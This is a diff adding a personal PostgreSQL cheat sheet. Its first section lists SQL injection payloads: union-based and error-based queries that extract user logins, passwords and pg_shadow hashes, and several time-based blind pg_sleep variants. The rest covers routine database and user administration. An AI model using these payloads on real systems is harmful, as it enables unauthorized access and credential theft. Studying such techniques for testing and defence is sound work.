@@ -1,0 +1,59 @@
+# postgres
+
+# SQLi-fu
+
+* fast exploitation in PosgreSQL >= 9.0 using string_agg function
+id=-1 union select null,string_agg(login||chr(58)||pass,chr(44)) from users;
+id |              news
+---+---------------------------------------
+   | admin:P@ssw0rd,root:Qwerty1,test:test123
+(1 row)
+
+* error based
+select * from news where id=1 and (select box(login||chr(58)||pass) from users) is not null; # also works with: circle, ilne, lseg, path, point, polygon instead of box
+
+1=cast((select table_name from information_schema.tables limit 1 offset 0) as int) => invalid input syntax for integer: "pg_type"
+1=cast((select usename from pg_shadow limit 1 offset 0) as int)
+1=cast((select passwd from pg_shadow limit 1 offset 0) as int)
+
+* time based blind
+ProductID = 1;SELECT pg_sleep(25)--
+ProductID = 1);SELECT pg_sleep(25)--
+ProductID = 1';SELECT pg_sleep(25)--
+ProductID = 1');SELECT pg_sleep(25)--
+ProductID = 1));SELECT pg_sleep(25)--
+ProductID = 1'));SELECT pg_sleep(25)--
+ProductID = SELECT pg_sleep(25)--
+
+# usage
+* lister les databases
+psql -l -U postgres
+
+* pour se connecter depuis localhost, il faut soit etre dans le groupe postgres soit etre l'utilisateur postgres ou root
+psql -U postgres
+
+* creer une bdd "test"
+createdb -U postgres -W test
+
+* supprimer la bdd test
+dropdb -U postgres -W test
+
+* creer un superuser
+createuser -a -d -P -E -U postgres -W chris
+
+* creer un user standard
+createuser -A -D -P -E -U chris -W testuser
+
+* creer une bdd owned par testuser
+createdb -O testuser -U chris -W MyDB
+
+* se connecter
+psql -U testuser -W MyDB
+
+# ezpublish
+$ createuser -a -d -P -E -U postgres ezpublish_user
+Enter password for new role: 
+Enter it again: 
+
+$ createdb -O ezpublish_user -U postgres ezpublish_db
+
